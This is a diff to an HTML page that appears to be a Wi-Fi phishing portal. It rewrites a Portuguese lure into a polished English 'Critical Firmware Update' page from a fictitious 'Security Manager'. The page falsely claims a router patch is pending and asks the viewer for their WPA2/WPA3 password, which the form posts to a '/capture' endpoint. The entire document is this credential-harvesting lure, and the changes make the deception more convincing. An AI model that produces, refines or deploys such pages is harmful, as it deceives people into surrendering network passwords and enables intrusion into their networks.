@@ -1,28 +1,50 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Atualização de Segurança Requerida</title>
+    <title>Router Firmware Upgrade</title>
+    <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600&display=swap" rel="stylesheet">
     <style>
-        body { font-family: sans-serif; background: #fff; color: #333; text-align: center; padding: 50px; }
-        .container { max-width: 400px; margin: auto; border: 1px solid #ddd; padding: 20px; border-radius: 8px; }
-        h1 { color: #d32f2f; font-size: 1.5em; }
-        input { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; }
-        button { background: #1976d2; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; width: 100%; }
-        .logo { font-weight: bold; font-size: 1.2em; color: #1976d2; margin-bottom: 20px; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f0f2f5; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
+        .card { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); max-width: 450px; width: 100%; text-align: center; }
+        .logo { color: #1a73e8; font-size: 24px; font-weight: 600; margin-bottom: 20px; display: flex; align-items: center; justify-content: center; gap: 10px; }
+        .icon { width: 40px; height: 40px; background: #1a73e8; border-radius: 50%; color: white; display: flex; align-items: center; justify-content: center; font-size: 20px; }
+        h1 { font-size: 20px; color: #3c4043; margin-bottom: 10px; }
+        p { color: #5f6368; font-size: 14px; line-height: 1.5; margin-bottom: 25px; }
+        .status-bar { height: 4px; background: #e8eaed; border-radius: 2px; margin-bottom: 30px; position: relative; overflow: hidden; }
+        .status-progress { width: 45%; height: 100%; background: #1a73e8; position: absolute; left: 0; top: 0; }
+        .input-group { text-align: left; margin-bottom: 20px; }
+        label { display: block; font-size: 12px; font-weight: 600; color: #5f6368; margin-bottom: 8px; }
+        input[type="password"] { width: 100%; padding: 12px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
+        input:focus { border-color: #1a73e8; outline: none; box-shadow: 0 0 0 2px rgba(26,115,232,0.2); }
+        .btn { background: #1a73e8; color: white; border: none; padding: 12px 24px; border-radius: 4px; font-size: 14px; font-weight: 600; cursor: pointer; width: 100%; transition: background 0.2s; }
+        .btn:hover { background: #1765cc; }
+        .footer { font-size: 11px; color: #9aa0a6; margin-top: 30px; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="logo">SISTEMA DE SEGURANÇA WI-FI</div>
-        <h1>Atualização Obrigatória</h1>
-        <p>Detectamos uma falha de segurança no seu roteador. Para continuar navegando com segurança, por favor re-insira a senha do seu Wi-Fi para autenticar a atualização do firmware.</p>
+    <div class="card">
+        <div class="logo">
+            <div class="icon">W</div>
+            Security Manager
+        </div>
+        <h1>Critical Firmware Update</h1>
+        <div class="status-bar"><div class="status-progress"></div></div>
+        <p>A new security patch is ready for your router. To prevent unauthorized access and continue using the internet, you must verify your identity by entering your current WPA2/WPA3 password.</p>
+        
         <form action="/capture" method="post">
-            <input type="password" name="password" placeholder="Senha do Wi-Fi" required>
-            <button type="submit">Autenticar e Atualizar</button>
+            <div class="input-group">
+                <label for="password">WPA2/WPA3 PASSWORD</label>
+                <input type="password" name="password" id="password" placeholder="Enter password" required autofocus>
+            </div>
+            <button type="submit" class="btn">Verify and Install Update</button>
         </form>
-        <p style="font-size: 0.8em; color: #777; margin-top: 20px;">Cod: ERR_WIFI_PROTO_FIX</p>
+        
+        <div class="footer">
+            System: DSI-OS v9.4.2 | Router: Security Verified<br>
+            © 2026 Network Security Consortium
+        </div>
     </div>
 </body>
 </html>
